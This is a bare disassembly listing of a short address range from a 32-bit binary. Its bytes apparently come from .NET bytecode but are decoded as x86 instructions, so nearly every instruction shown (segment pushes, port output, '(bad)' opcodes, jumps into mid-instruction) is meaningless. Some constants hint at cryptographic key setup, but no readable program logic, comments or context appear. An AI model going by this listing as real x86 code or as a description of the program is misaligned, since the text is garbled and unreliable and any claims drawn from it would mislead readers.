  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 ae             	or     -0x52(%edx),%dh
  403d47:	22 00                	and    (%eax),%al
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	dc 01                	faddl  (%ecx)
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 b4                	jb     0x403d75
  403dc1:	22 00                	and    (%eax),%al
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	72 14                	jb     0x403de6
  403dd2:	27                   	daa
  403dd3:	00 70 28             	add    %dh,0x28(%eax)
  403dd6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403ddb:	25 00 00 00 07       	and    $0x7000000,%eax
  403de0:	72 1e                	jb     0x403e00
  403de2:	27                   	daa
  403de3:	00 70 28             	add    %dh,0x28(%eax)
  403de6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403deb:	60                   	pusha
  403dec:	00 00                	add    %al,(%eax)
  403dee:	00 07                	add    %al,(%edi)
  403df0:	72 2c                	jb     0x403e1e
  403df2:	27                   	daa
  403df3:	00 70 28             	add    %dh,0x28(%eax)
  403df6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403dfb:	d9 00                	flds   (%eax)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e02:	00 00                	add    %al,(%eax)
  403e04:	16                   	push   %ss
  403e05:	28 1a                	sub    %bl,(%edx)
  403e07:	00 00                	add    %al,(%eax)
  403e09:	06                   	push   %es
  403e0a:	73 94                	jae    0x403da0
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	06                   	push   %es
  403e0f:	25 72 b4 22 00       	and    $0x22b472,%eax
  403e14:	70 6f                	jo     0x403e85
  403e16:	7f 00                	jg     0x403e18
  403e18:	00 06                	add    %al,(%esi)
  403e1a:	72 14                	jb     0x403e30
  403e1c:	27                   	daa
  403e1d:	00 70 6f             	add    %dh,0x6f(%eax)
  403e20:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e26:	cc                   	int3
  403e27:	22 00                	and    (%eax),%al
  403e29:	70 6f                	jo     0x403e9a
  403e2b:	7f 00                	jg     0x403e2d
  403e2d:	00 06                	add    %al,(%esi)
  403e2f:	28 17                	sub    %dl,(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	06                   	push   %es
  403e34:	6a 6f                	push   $0x6f
  403e36:	74 00                	je     0x403e38
  403e38:	00 06                	add    %al,(%esi)
  403e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3b:	89 00                	mov    %eax,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	28 20                	sub    %ah,(%eax)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	16                   	push   %ss
  403e45:	28 18                	sub    %bl,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 06                	add    %al,(%esi)
  403e51:	72 42                	jb     0x403e95
  403e53:	27                   	daa
  403e54:	00 70 6f             	add    %dh,0x6f(%eax)
  403e57:	7f 00                	jg     0x403e59
  403e59:	00 06                	add    %al,(%esi)
  403e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5c:	8b 00                	mov    (%eax),%eax
  403e5e:	00 06                	add    %al,(%esi)
  403e60:	28 42 00             	sub    %al,0x0(%edx)
  403e63:	00 06                	add    %al,(%esi)
  403e65:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e69:	00 7e 24             	add    %bh,0x24(%esi)
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	04 06                	add    $0x6,%al
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e76:	94                   	xchg   %eax,%esp
  403e77:	00 00                	add    %al,(%eax)
  403e79:	06                   	push   %es
  403e7a:	25 72 b4 22 00       	and    $0x22b472,%eax
  403e7f:	70 6f                	jo     0x403ef0
  403e81:	7f 00                	jg     0x403e83
  403e83:	00 06                	add    %al,(%esi)
  403e85:	72 4a                	jb     0x403ed1
  403e87:	27                   	daa
  403e88:	00 70 6f             	add    %dh,0x6f(%eax)
  403e8b:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e91:	60                   	pusha
  403e92:	27                   	daa
  403e93:	00 70 6f             	add    %dh,0x6f(%eax)
  403e96:	7f 00                	jg     0x403e98
  403e98:	00 06                	add    %al,(%esi)
  403e9a:	06                   	push   %es
  403e9b:	72 42                	jb     0x403edf
  403e9d:	27                   	daa
  403e9e:	00 70 6f             	add    %dh,0x6f(%eax)
  403ea1:	7f 00                	jg     0x403ea3
  403ea3:	00 06                	add    %al,(%esi)
  403ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea6:	8b 00                	mov    (%eax),%eax
  403ea8:	00 06                	add    %al,(%esi)
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	06                   	push   %es
  403eb4:	28 20                	sub    %ah,(%eax)
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	06                   	push   %es
  403eb9:	38 06                	cmp    %al,(%esi)
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	00 06                	add    %al,(%esi)
  403ebf:	28 47 00             	sub    %al,0x0(%edi)
  403ec2:	00 06                	add    %al,(%esi)
  403ec4:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403eca:	b3 00                	mov    $0x0,%bl
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403ed9:	72 6e                	jb     0x403f49
  403edb:	27                   	daa
  403edc:	00 70 6f             	add    %dh,0x6f(%eax)
  403edf:	7f 00                	jg     0x403ee1
  403ee1:	00 06                	add    %al,(%esi)
  403ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee4:	8b 00                	mov    (%eax),%eax
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	06                   	push   %es
  403ee9:	72 42                	jb     0x403f2d
  403eeb:	27                   	daa
  403eec:	00 70 6f             	add    %dh,0x6f(%eax)
  403eef:	7f 00                	jg     0x403ef1
  403ef1:	00 06                	add    %al,(%esi)
  403ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef4:	7a 00                	jp     0x403ef6
  403ef6:	00 06                	add    %al,(%esi)
  403ef8:	28 41 00             	sub    %al,0x0(%ecx)
  403efb:	00 06                	add    %al,(%esi)
  403efd:	26 7e 24             	es jle 0x403f24
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 28                	add    $0x28,%al
  403f04:	01 00                	add    %eax,(%eax)
  403f06:	00 2b                	add    %ch,(%ebx)
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f0e:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f12:	00 12                	add    %dl,(%edx)
  403f14:	02 28                	add    (%eax),%ch
  403f16:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f1b:	09 72 42             	or     %esi,0x42(%edx)
  403f1e:	27                   	daa
  403f1f:	00 70 6f             	add    %dh,0x6f(%eax)
  403f22:	7f 00                	jg     0x403f24
  403f24:	00 06                	add    %al,(%esi)
  403f26:	6f                   	outsl  %ds:(%esi),(%dx)
  403f27:	8b 00                	mov    (%eax),%eax
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	06                   	push   %es
  403f2c:	72 6e                	jb     0x403f9c
  403f2e:	27                   	daa
  403f2f:	00 70 6f             	add    %dh,0x6f(%eax)
  403f32:	7f 00                	jg     0x403f34
  403f34:	00 06                	add    %al,(%esi)
  403f36:	6f                   	outsl  %ds:(%esi),(%dx)
  403f37:	8b 00                	mov    (%eax),%eax
  403f39:	00 06                	add    %al,(%esi)
  403f3b:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f41:	12 00                	adc    (%eax),%al
  403f43:	00 00                	add    %al,(%eax)
  403f45:	09 28                	or     %ebp,(%eax)
  403f47:	47                   	inc    %edi
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	06                   	push   %es
  403f4b:	7e 24                	jle    0x403f71
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 09                	add    $0x9,%al
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f57:	12 02                	adc    (%edx),%al
  403f59:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f5f:	b3 dd                	mov    $0xdd,%bl
  403f61:	0e                   	push   %cs
  403f62:	00 00                	add    %al,(%eax)
  403f64:	00 12                	add    %dl,(%edx)
  403f66:	02 fe                	add    %dh,%bh
  403f68:	16                   	push   %ss
  403f69:	04 00                	add    $0x0,%al
  403f6b:	00 1b                	add    %bl,(%ebx)
  403f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6e:	33 00                	xor    (%eax),%eax
  403f70:	00 0a                	add    %cl,(%edx)
  403f72:	dc dd                	(bad)
  403f74:	0f 00 00             	sldt   (%eax)
  403f77:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f7a:	00 00                	add    %al,(%eax)
  403f7c:	0a 28                	or     (%eax),%ch
  403f7e:	49                   	dec    %ecx
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	06                   	push   %es
  403f82:	dd 00                	fldl   (%eax)
  403f84:	00 00                	add    %al,(%eax)
  403f86:	00 2a                	add    %ch,(%edx)
  403f88:	41                   	inc    %ecx
  403f89:	4c                   	dec    %esp
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 00                	add    %al,(%eax)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 79 00             	add    %bh,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 31                	add    %dh,(%ecx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	01 02                	add    %eax,(%edx)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	00 62 01             	add    %ah,0x1(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	57                   	push   %edi
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 cc                	add    %cl,%ah
  403fc5:	01 00                	add    %eax,(%eax)
  403fc7:	00 cc                	add    %cl,%ah
  403fc9:	01 00                	add    %eax,(%eax)
  403fcb:	00 0f                	add    %cl,(%edi)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 00                	add    %al,(%eax)
  403fd3:	01 13                	add    %edx,(%ebx)
  403fd5:	30 0b                	xor    %cl,(%ebx)
  403fd7:	00 11                	add    %dl,(%ecx)
  403fd9:	01 00                	add    %eax,(%eax)
  403fdb:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fde:	00 11                	add    %dl,(%ecx)
  403fe0:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fe6:	72 42                	jb     0x40402a
  403fe8:	27                   	daa
  403fe9:	00 70 6f             	add    %dh,0x6f(%eax)
  403fec:	7f 00                	jg     0x403fee
  403fee:	00 06                	add    %al,(%esi)
  403ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff1:	8b 00                	mov    (%eax),%eax
  403ff3:	00 06                	add    %al,(%esi)
  403ff5:	28 42 00             	sub    %al,0x0(%edx)
  403ff8:	00 06                	add    %al,(%esi)
  403ffa:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404000:	c0 00 00             	rolb   $0x0,(%eax)
  404003:	0a 72 78             	or     0x78(%edx),%dh
  404006:	27                   	daa
  404007:	00 70 6f             	add    %dh,0x6f(%eax)
  40400a:	c1 00 00             	roll   $0x0,(%eax)
  40400d:	0a 28                	or     (%eax),%ch
  40400f:	c2 00 00             	ret    $0x0
  404012:	0a 0a                	or     (%edx),%cl
  404014:	7e 25                	jle    0x40403b
  404016:	00 00                	add    %al,(%eax)
  404018:	04 3a                	add    $0x3a,%al
  40401a:	85 00                	test   %eax,(%eax)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	20 00                	and    %al,(%eax)
  404020:	01 00                	add    %eax,(%eax)
  404022:	00 72 94             	add    %dh,-0x6c(%edx)
  404025:	27                   	daa
  404026:	00 70 14             	add    %dh,0x14(%eax)
  404029:	d0 0f                	rorb   $1,(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	02 28                	add    (%eax),%ch
  40402f:	c3                   	ret
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 1f                	or     (%edi),%bl
  404034:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  40403a:	25 16 16 14 28       	and    $0x28141616,%eax
  40403f:	c4 00                	les    (%eax),%eax
  404041:	00 0a                	add    %cl,(%edx)
  404043:	a2 25 17 17 14       	mov    %al,0x14171725
  404048:	28 c4                	sub    %al,%ah
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  404052:	28 c4                	sub    %al,%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  40405c:	28 c4                	sub    %al,%ah
  40405e:	00 00                	add    %al,(%eax)
  404060:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  404066:	28 c4                	sub    %al,%ah
  404068:	00 00                	add    %al,(%eax)
  40406a:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404070:	28 c4                	sub    %al,%ah
  404072:	00 00                	add    %al,(%eax)
  404074:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  40407a:	28 c4                	sub    %al,%ah
  40407c:	00 00                	add    %al,(%eax)
  40407e:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  404084:	28 c4                	sub    %al,%ah
  404086:	00 00                	add    %al,(%eax)
  404088:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  40408e:	28 c4                	sub    %al,%ah
  404090:	00 00                	add    %al,(%eax)
  404092:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  404098:	0a 28                	or     (%eax),%ch
  40409a:	c6 00 00             	movb   $0x0,(%eax)
  40409d:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040a3:	7e 25                	jle    0x4040ca
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 7b                	add    $0x7b,%al
  4040a9:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	04 06                	add    $0x6,%al
  4040b3:	28 06                	sub    %al,(%esi)
  4040b5:	00 00                	add    %al,(%eax)
  4040b7:	06                   	push   %es
  4040b8:	7e 0b                	jle    0x4040c5
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 7e                	add    $0x7e,%al
  4040be:	10 00                	adc    %al,(%eax)
  4040c0:	00 04 02             	add    %al,(%edx,%eax,1)
  4040c3:	72 9c                	jb     0x404061
  4040c5:	27                   	daa
  4040c6:	00 70 6f             	add    %dh,0x6f(%eax)
  4040c9:	7f 00                	jg     0x4040cb
  4040cb:	00 06                	add    %al,(%esi)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	7a 00                	jp     0x4040d0
  4040d0:	00 06                	add    %al,(%esi)
  4040d2:	7e 1e                	jle    0x4040f2
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	04 7e                	add    $0x7e,%al
  4040d8:	08 00                	or     %al,(%eax)
  4040da:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040dd:	0f 00 00             	sldt   (%eax)
  4040e0:	04 7e                	add    $0x7e,%al
  4040e2:	04 00                	add    $0x0,%al
  4040e4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040e7:	c8 00 00 0a          	enter  $0x0,$0xa
  4040eb:	28 48 00             	sub    %cl,0x0(%eax)
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	2a 00                	sub    (%eax),%al
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	1b 30                	sbb    (%eax),%esi
  4040f6:	03 00                	add    (%eax),%eax
  4040f8:	5c                   	pop    %esp
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 15 00 00 11 02    	add    %dl,0x2110000
  404101:	28 18                	sub    %bl,(%eax)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 03                	or     (%ebx),%al
  404107:	28 ca                	sub    %cl,%dl
  404109:	00 00                	add    %al,(%eax)
  40410b:	0a 39                	or     (%ecx),%bh
  40410d:	0b 00                	or     (%eax),%eax
  40410f:	00 00                	add    %al,(%eax)
  404111:	72 ca                	jb     0x4040dd
  404113:	27                   	daa
  404114:	00 70 73             	add    %dh,0x73(%eax)
  404117:	cb                   	lret
  404118:	00 00                	add    %al,(%eax)
  40411a:	0a 7a 03             	or     0x3(%edx),%bh
  40411d:	7e 2c                	jle    0x40414b
  40411f:	00 00                	add    %al,(%eax)
  404121:	04 20                	add    $0x20,%al
  404123:	50                   	push   %eax
  404124:	c3                   	ret
  404125:	00 00                	add    %al,(%eax)
  404127:	73 cc                	jae    0x4040f5
  404129:	00 00                	add    %al,(%eax)
  40412b:	0a 0a                	or     (%edx),%cl
  40412d:	02 06                	add    (%esi),%al
  40412f:	1f                   	pop    %ds
  404130:	20 6f cd             	and    %ch,-0x33(%edi)
  404133:	00 00                	add    %al,(%eax)
  404135:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404138:	00 00                	add    %al,(%eax)
  40413a:	04 02                	add    $0x2,%al
  40413c:	06                   	push   %es
  40413d:	1f                   	pop    %ds
  40413e:	40                   	inc    %eax
  40413f:	6f                   	outsl  %ds:(%esi),(%dx)
  404140:	cd 00                	int    $0x0
  404142:	00 0a                	add    %cl,(%edx)
  404144:	7d 2b                	jge    0x404171
  404146:	00 00                	add    %al,(%eax)
  404148:	04 dd                	add    $0xdd,%al
  40414a:	0d 00 00 00 06       	or     $0x6000000,%eax
  40414f:	39 06                	cmp    %eax,(%esi)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 06                	add    %al,(%esi)
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	33 00                	xor    (%eax),%eax
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	dc 2a                	fsubrl (%edx)
  40415c:	01 10                	add    %edx,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  404167:	0d 00 00 00 00       	or     $0x0,%eax
  40416c:	1b 30                	sbb    (%eax),%esi
  40416e:	05 00 15 01 00       	add    $0x11500,%eax
  404173:	00 16                	add    %dl,(%esi)
  404175:	00 00                	add    %al,(%eax)
  404177:	11 03                	adc    %eax,(%ebx)
  404179:	3a 0b                	cmp    (%ebx),%cl
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 72 12             	add    %dh,0x12(%edx)
  404180:	28 00                	sub    %al,(%eax)
  404182:	70 73                	jo     0x4041f7
  404184:	cf                   	iret
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 7a 73             	or     0x73(%edx),%bh
  40418a:	d0 00                	rolb   $1,(%eax)
  40418c:	00 0a                	add    %cl,(%edx)
  40418e:	0a 06                	or     (%esi),%al
  404190:	1f                   	pop    %ds
  404191:	20 6a 6f             	and    %ch,0x6f(%edx)
  404194:	4e                   	dec    %esi
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40419a:	00 00                	add    %al,(%eax)
  40419c:	0a 0b                	or     (%ebx),%cl
  40419e:	07                   	pop    %es
  40419f:	20 00                	and    %al,(%eax)
  4041a1:	01 00                	add    %eax,(%eax)
  4041a3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	0a 07                	or     (%edi),%al
  4041aa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b0:	d3 00                	roll   %cl,(%eax)
  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	07                   	pop    %es
  4041b5:	17                   	pop    %ss
